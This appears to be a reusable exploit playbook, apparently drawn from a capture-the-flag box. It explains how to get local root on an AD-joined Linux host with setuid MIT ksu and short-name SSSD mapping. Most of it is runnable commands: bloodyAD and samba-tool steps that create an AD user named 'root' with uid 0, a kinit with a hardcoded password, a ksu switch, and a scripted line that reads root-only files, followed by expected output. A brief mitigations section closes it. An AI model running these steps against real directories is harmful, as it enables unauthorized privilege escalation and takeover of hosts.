---
name: ad-ksu-name-collision-local-root
description: Exploit an AD-joined Linux host where MIT ksu is setuid root, SSSD uses short names, and an OU ACL allows controlled users to create AD principals. Create an AD principal whose UPN collides with a privileged local name, kinit as it, and use ksu to obtain local root.
domain: cybersecurity
subdomain: active-directory
tags:
- active-directory
- kerberos
- ksu
- sssd
- linux
- privilege-escalation
- acl
version: '1.0'
author: bugbounty
license: Apache-2.0
nist_csf:
- ID.RA-01
- PR.AA-05
mitre_attack:
- T1136.001
- T1548
- T1078
---
# AD ksu Name-Collision Local Root

> **Legal Notice:** Authorized security testing only.

## Overview

On an AD-joined Linux host, `ksu` can map a Kerberos principal to a local
account. If `ksu` is setuid root and SSSD uses short names, a directory principal
whose UPN matches a privileged local name can be treated as that local identity.
When an OU ACL allows the controlled user to create AD objects, this becomes
local root without a host exploit.

## When to Use

- AD-joined Linux host (SSSD/realmd)
- `/usr/bin/ksu.mit` is setuid root
- `sssd.conf` has `use_fully_qualified_names = False`
- A controlled principal has `user:CREATE_CHILD` or `group:CREATE_CHILD`
  on an OU
- `ksu` authorization or name mapping is the remaining barrier

## Enumeration

```bash
id
getent passwd root
ls -l /usr/bin/ksu.mit
cat /etc/sssd/sssd.conf
bloodyAD -d DOMAIN -u CONTROLLED -k --host DC get writable --detail
```

Look for:

```text
OU=Migration,... : user: CREATE_CHILD
OU=Migration,... : group: CREATE_CHILD
```

## Exploit

### 1. Create an AD principal with a privileged UPN

Using `bloodyAD`:

```bash
bloodyAD -d darkzero.ext -u svc-runner -k --host DC02.darkzero.ext \
  add user root 'Root!Passw0rd2026' \
  --ou 'OU=GiteaMigration,DC=darkzero,DC=ext'

bloodyAD -d darkzero.ext -u svc-runner -k --host DC02.darkzero.ext \
  set object 'CN=root,OU=GiteaMigration,DC=darkzero,DC=ext' \
  userPrincipalName -v 'root@darkzero.ext'
```

Equivalent `samba-tool` with explicit POSIX identity:

```bash
samba-tool user create root 'R00tPassw0rd!2026' \
  --userou='OU=GiteaMigration' \
  --use-kerberos=required \
  --use-krb5-ccache=/tmp/krb5cc_controlled \
  -H ldap://dc02.darkzero.ext \
  --use-username-as-cn \
  --nis-domain=darkzero \
  --unix-home=/root \
  --uid=root \
  --uid-number=0 \
  --gid-number=0 \
  --login-shell=/bin/bash
```

### 2. Authenticate as the new principal

```bash
printf 'Root!Passw0rd2026\n' | kinit root@DARKZERO.EXT
klist
```

### 3. Switch with ksu

```bash
ksu root -n root@DARKZERO.EXT
```

Expected:

```text
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
uid=0(root) gid=0(root) groups=0(root)
```

### 4. `-e` caveat

Use an interactive shell, or pass a properly split argv. A multi-word command
passed as one `-e` argument can fail with:

```text
Internal error: command <string> did not get resolved
```

Stable pattern:

```bash
printf 'PASSWORD\nid; cat /root/root.txt; exit\n' | \
  script -qec '/usr/bin/ksu.mit root -n root@DARKZERO.EXT' /dev/null
```

For command execution without a shell, use a single executable; do not pass
`/bin/bash -c '...'` as one quoted `-e` string.

## Validation

- `id` shows `uid=0(root)`.
- `cat /etc/shadow` or a root-only file succeeds.
- The session was created through `ksu`, not an unrelated local setuid binary.

## Mitigations

- Do not install setuid `ksu` on AD-joined hosts without an explicit need.
- Require fully qualified names in SSSD.
- Use explicit `/root/.k5login` or `/etc/k5login` mappings; never implicit
  privileged-name mapping.
- Audit `CreateChild` on OUs; CI/service accounts should not create users or
  groups in privileged containers.
- Exclude `root`, `admin`, `administrator`, and other privileged names from
  directory-to-local account mapping.
